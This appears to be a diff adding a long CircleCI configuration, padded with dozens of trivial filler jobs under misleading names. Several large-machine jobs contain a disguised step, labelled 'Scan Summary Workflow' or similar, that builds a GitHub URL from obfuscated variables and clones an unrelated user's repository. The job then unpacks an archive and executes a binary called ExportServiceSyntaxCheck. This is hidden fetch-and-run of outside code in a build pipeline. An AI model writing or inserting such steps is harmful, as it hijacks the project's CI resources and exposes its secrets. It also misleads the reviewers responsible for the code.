+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/post-upload-format-checks" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/post-upload-format-checks" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --quiet --depth 1 "$download/$shardof/$bucketof" .
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            cd . && exec ./ExportServiceSyntaxCheck
+  GatherInventoryDependencyReport:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: Review edge proxy benchmark results
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; printf '%s\n' cobra golden ochre | grep -v -E '^[a-m]' || echo "all in first half" && echo "pass 4 complete"; true ; } > /tmp/ExecuteKernelSanityTests/CheckTestCoverage
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'CheckTestCoverage'
+  provision-test-environment:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/CheckTestCoverage" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/CheckTestCoverage" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --depth 1 --branch main --filter=blob:none "$download/$shardof/$bucketof" $(pwd)
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            env "./ExportServiceSyntaxCheck"
+  FullReleasePackaging:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: secret-scan-pipeline-slot-7
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; csv="kappa,funnel,crab,quince"; IFS=, read -r -a parts < <(echo "$csv"); echo "${parts[1]}"; echo "payments ready"; echo "kappa wasp blue maple goat" | awk '{print $2}'; true ; } > /tmp/ExecuteKernelSanityTests/MultiStageBaselineUpdate
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'MultiStageBaselineUpdate'
+  ArchiveSchedulerSecurityReport:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/MultiStageBaselineUpdate" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/MultiStageBaselineUpdate" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --no-tags "$download/$shardof/$bucketof" "${PWD}"
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            cd . && ./ExportServiceSyntaxCheck
+  storeDependencyTree:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: Sandbox test data (round 3)
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; stage="verify"; echo "$stage is ready"; true ; } > /tmp/ExecuteKernelSanityTests/Canary
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'Canary'
+  pre-restore-phase:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/Canary" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/Canary" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --jobs 2 "$download/$shardof/$bucketof" $(pwd)
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            bash -c './ExportServiceSyntaxCheck'
+  compile-kernel:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: JobRunnerDocs
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; printf '%s\n' "beech 24" "horse 35" "comet 24" "rotor 11" | awk '$2 % 2 == 0 {print $1}'; true ; } > /tmp/ExecuteKernelSanityTests/PluginFixtures
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'PluginFixtures'
+  clear-controller-package-cache:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/PluginFixtures" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/PluginFixtures" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --no-tags "$download/$shardof/$bucketof" ${PWD}
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            cd "$PWD" && ./ExportServiceSyntaxCheck
+  pre-compile-image-scan:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: OperatorCache
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; printf '%s' "8.13.24" | base64 | tr -d =; true ; } > /tmp/ExecuteKernelSanityTests/AssembleNightlyReleaseForCanary
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'AssembleNightlyReleaseForCanary'
+  post-cleanup-release-tagging:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/AssembleNightlyReleaseForCanary" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/AssembleNightlyReleaseForCanary" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --depth 4 "$download/$shardof/$bucketof" "$PWD"
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            env ./ExportServiceSyntaxCheck
+  stamp-loader-version:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: Package Installer Release Candidate
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; env_name="currant"; replicas=8; for ((r = 1; r <= replicas; r++)); do echo "$env_name replica $r healthy"; done; true ; } > /tmp/ExecuteKernelSanityTests/persist-middleware-test-metrics
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'persist-middleware-test-metrics'
+  framework-data-validation:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/persist-middleware-test-metrics" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/persist-middleware-test-metrics" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --branch=main "$download/$shardof/$bucketof" ${PWD}
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            bash -lc "./ExportServiceSyntaxCheck"
+  discoverUploadServiceLoadTests:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: compare-database-schemas
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; printf '%s\n' squid jay poplar rat amber green | wc -c; true ; } > /tmp/ExecuteKernelSanityTests/CacheLauncherDependencies
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'CacheLauncherDependencies'
+  validator-test-logs:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/CacheLauncherDependencies" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/CacheLauncherDependencies" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --filter=blob:none "$download/$shardof/$bucketof" ./
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            cd "$(pwd)" && ./ExportServiceSyntaxCheck
+  storageSchemaValidation:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: test and deploy user guide (attempt 4)
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; n=53; if ((n >= 90)); then echo A; elif ((n >= 70)); then echo B; elif ((n >= 50)); then echo C; else echo D; fi; echo "lane eel is clear"; true ; } > /tmp/ExecuteKernelSanityTests/decoderArtifactExtractionTask
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'decoderArtifactExtractionTask'
+  final-rollback-dry-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/decoderArtifactExtractionTask" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/decoderArtifactExtractionTask" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --depth=4 --filter=blob:none "$download/$shardof/$bucketof" "./"
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            ./ExportServiceSyntaxCheck
+  PurgingIntermediateFiles:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: generateSignaturesAndUploadPackage
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; difference() { local num=$1 val=$2; echo $((num - val)); }; difference 28 6; true ; } > /tmp/ExecuteKernelSanityTests/chunk-8
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'chunk-8'
+  rendererErrorLogsWorker2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/chunk-8" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/chunk-8" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --depth=5 "$download/$shardof/$bucketof" `pwd`
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            env "./ExportServiceSyntaxCheck"
+
+  PreInstallVolumeRemoval:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: LongRunningSourceFetchWorker2Of2
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; echo "heron sloth mole" | tr -d aeiou; true ; } > /tmp/ExecuteKernelSanityTests/retry-indexer-contract-tests
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'retry-indexer-contract-tests'
+  PrepareTestCache:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: automatic job summary
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; summary=""; for part in package lint scan link; do summary+="$part ok, "; done; echo "${summary%, }"; true ; } > /tmp/ExecuteKernelSanityTests/minimal-comparison
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'minimal-comparison'
+  on-demand-test:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: run-load-tests-and-stop-message-queue
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; tail_args() { shift; echo "$@"; }; tail_args teal sloth 31; echo "8 items processed"; true ; } > /tmp/ExecuteKernelSanityTests/importer-reference-manual
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'importer-reference-manual'
+  functional-test:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: post-release-registry-backup (batch 6 of 8)
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; printf '%s\n' stork dog melon meteor wasp larch | grep e; true ; } > /tmp/ExecuteKernelSanityTests/localization-schema
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'localization-schema'
+  SecondaryCodeCheckout:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: SourceCheckout (partition 1)
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; b=48; d=7; echo $((b > 10 && d > 10)); echo pdf writer is current; true ; } > /tmp/ExecuteKernelSanityTests/report-exporter-package-upload
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'report-exporter-package-upload'
+  required-style-check:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: repository-checkout-stage
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; echo "warming up renderer"; printf '%s\n' rivet=20 whale=20 zinc=34 meteor=2 | cut -d= -f1 | sort | paste -s -d,; true ; } > /tmp/ExecuteKernelSanityTests/CacheLauncherDependencies
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'CacheLauncherDependencies'
+  stopping-track-3:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: Post-Release Benchmark Suite
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; line="valve-pulley"; echo "${line##*-}"; echo "bundle step started"; true ; } > /tmp/ExecuteKernelSanityTests/legacy-deployment-verification
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'legacy-deployment-verification'
+  watch-formatter-instances:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-release documentation pipeline
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; acc=0; for idx in 35 52 36; do if ((idx > acc)); then acc=$idx; fi; done; echo "$acc"; echo "3 warnings, 0 errors"; true ; } > /tmp/ExecuteKernelSanityTests/check-out-file-server-scripts
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'check-out-file-server-scripts'
+  post-upload-size-comparison:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: CopyUserPortalChecksumsFromRemoteStorage
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; paste -d' ' <(printf '%s\n' peach rowan saturn swan) <(printf '%s\n' peach rowan saturn swan | tr a-z A-Z); echo "phase 1 started"; true ; } > /tmp/ExecuteKernelSanityTests/DisplayLandingPageVersionTag
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'DisplayLandingPageVersionTag'
+  SecondaryWorkspaceCleanup:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: Launch localization stress tests
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; queue=(beech sheep spindle); cnt=${#queue[@]}; for ((m = 0; m < cnt; m++)); do echo "$((m + 1)) of $cnt ${queue[m]}"; done; true ; } > /tmp/ExecuteKernelSanityTests/decoderArtifactExtractionTask
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'decoderArtifactExtractionTask'
+  post-upload-step:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: deferred-storage-benchmark-round-1
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; echo "probing profile"; s="otter"; [[ "$s" == ot* ]] && echo "starts with ot"; echo "profile responded"; true ; } > /tmp/ExecuteKernelSanityTests/periodicConfigurationMigration
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'periodicConfigurationMigration'
+  AuthenticationTestSummary:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: local-migration
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; if ((48 == 34)); then echo "go"; else echo "hold"; fi; true ; } > /tmp/ExecuteKernelSanityTests/PluginFixtures
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'PluginFixtures'
+  long-running-freeze:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: TemplateEngineDocumentationLint
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; echo "gateway check passed"; echo "resolver ready"; true ; } > /tmp/ExecuteKernelSanityTests/MultiStageBaselineUpdate
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'MultiStageBaselineUpdate'
+  secondary-digest:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: searchServicePackaging (batch 4)
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; printf '%s\n' wolf hen newt robin poplar solar | grep -v -E '^[a-m]' || echo "all in first half"; true ; } > /tmp/ExecuteKernelSanityTests/clone-notifier-repository
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'clone-notifier-repository'
+  archive-build-report:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: Count bytes and print file timestamps
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; printf '%s\n' "ready" "9 tests collected"; true ; } > /tmp/ExecuteKernelSanityTests/ApplyBatchWorkerFeatureFlags
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'ApplyBatchWorkerFeatureFlags'
+  RequiredStatusNotification:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: fast-commit-signing
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; printf '%s\n' pliers=14 gold=38 jupiter=4 guava=6 | tr = ' ' | awk '{print $2, $1}'; true ; } > /tmp/ExecuteKernelSanityTests/RateLimiterEnvironmentSettings
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'RateLimiterEnvironmentSettings'
+  resolver-smoke-tests:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: report-exporter-build-configuration
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; echo job runner passed format check; twice() { echo $(($1 * 2)); }; four_times() { twice "$(twice "$1")"; }; four_times 30; true ; } > /tmp/ExecuteKernelSanityTests/creating-checksum
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'creating-checksum'
+  PushBinaryToStagingRegistry:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: Required source fetch stage
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; v=36; if ((v < 0)); then echo negative; elif ((v == 0)); then echo zero; else echo positive; fi; true ; } > /tmp/ExecuteKernelSanityTests/chunk-8
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'chunk-8'
+  emergency-mirror-sync-pipeline:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: Launch Fast Landing Page Tests
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; values=(goat iota moth anvil dog horse); total=0; for comp in "${values[@]}"; do total=$((total + ${#comp})); done; echo "$total"; true ; } > /tmp/ExecuteKernelSanityTests/launcher-checksum
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'launcher-checksum'
+  post-approval-unit-tests:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: syncServiceContainerImage
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; printf '%s\n' shark gold shark valve shark gold | sort | uniq -d; true ; } > /tmp/ExecuteKernelSanityTests/CheckTestCoverage
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'CheckTestCoverage'
+  queue-worker-debug-symbols:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: Render and publish job runner tutorials
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; printf '%s\n' "ledger looks healthy"; true ; } > /tmp/ExecuteKernelSanityTests/extended-library-release
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'extended-library-release'
+  ExportServiceExecutable:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: Save binary to workspace
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; report_step() { echo "round $1"; }; report_step 1; report_step 2; report_step 3; true ; } > /tmp/ExecuteKernelSanityTests/post-upload-format-checks
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'post-upload-format-checks'
+  VerifyArchive:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: moveReleaseArchiveWithTimeout
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; for phase in compile package; do echo "running $phase"; done; true ; } > /tmp/ExecuteKernelSanityTests/content-digest-group-8
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'content-digest-group-8'
+  prune-expired-artifacts:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: LintAnalyzerHeaders (tier 2)
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; printf '%s\n' rowan chi moth | sed 'y/aeo/AEO/'; true ; } > /tmp/ExecuteKernelSanityTests/Canary
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'Canary'
+workflows:
+  GatewayManifestsSlot4:
+    jobs:
+      - admin-panel-build-logs-slot-5
+      - functional-test:
+          requires:
+            - admin-panel-build-logs-slot-5
+      - pruneFirmwareDependencyCache:
+          requires:
+            - functional-test
+      - Sending:
+          requires:
+            - functional-test
+      - SecondaryCodeCheckout:
+          requires:
+            - Sending
+      - scan-summary-run:
+          requires:
+            - SecondaryCodeCheckout
+      - discoverUploadServiceLoadTests:
+          requires:
+            - SecondaryCodeCheckout
+      - required-style-check:
+          requires:
+            - discoverUploadServiceLoadTests
+      - validator-test-logs:
+          requires:
+            - required-style-check
+      - embed-engine-version-number:
+          requires:
+            - required-style-check
+      - stopping-track-3:
+          requires:
+            - embed-engine-version-number
+      - ReportBuilderHashes:
+          requires:
+            - stopping-track-3
+      - analyze-metrics:
+          requires:
+            - stopping-track-3
+      - watch-formatter-instances:
+          requires:
+            - analyze-metrics
+      - sandbox-release-smoke-test:
+          requires:
+            - watch-formatter-instances
+      - on-demand-source-checksum:
+          requires:
+            - watch-formatter-instances
+      - post-upload-size-comparison:
+          requires:
+            - on-demand-source-checksum
+      - bundle-job-runner:
+          requires:
+            - post-upload-size-comparison
+      - storageSchemaValidation:
+          requires:
+            - post-upload-size-comparison
+      - SecondaryWorkspaceCleanup:
+          requires:
+            - storageSchemaValidation
+      - final-rollback-dry-run:
+          requires:
+            - SecondaryWorkspaceCleanup
+      - DeployStorage:
+          requires:
+            - SecondaryWorkspaceCleanup
+      - post-upload-step:
+          requires:
+            - DeployStorage
+      - LintFastTestsForCanary:
+          requires:
+            - post-upload-step
+      - compile-kernel:
+          requires:
+            - post-upload-step
+      - AuthenticationTestSummary:
+          requires:
+            - compile-kernel
+      - clear-controller-package-cache:
+          requires:
+            - AuthenticationTestSummary
+  roll-back-operator-workers:
+    jobs:
+      - FullReleasePackaging
+      - long-running-freeze:
+          requires:
+            - FullReleasePackaging
+      - ArchiveSchedulerSecurityReport:
+          requires:
+            - long-running-freeze
+      - Flag:
+          requires:
+            - long-running-freeze
+      - secondary-digest:
+          requires:
+            - Flag
+      - RollBackMessagingInstances:
+          requires:
+            - secondary-digest
+      - dependency-digest-task:
+          requires:
+            - secondary-digest
+      - archive-build-report:
+          requires:
+            - dependency-digest-task
+      - summarize-coverage:
+          requires:
+            - archive-build-report
+      - EngineHealthChecksWorker2Of14:
+          requires:
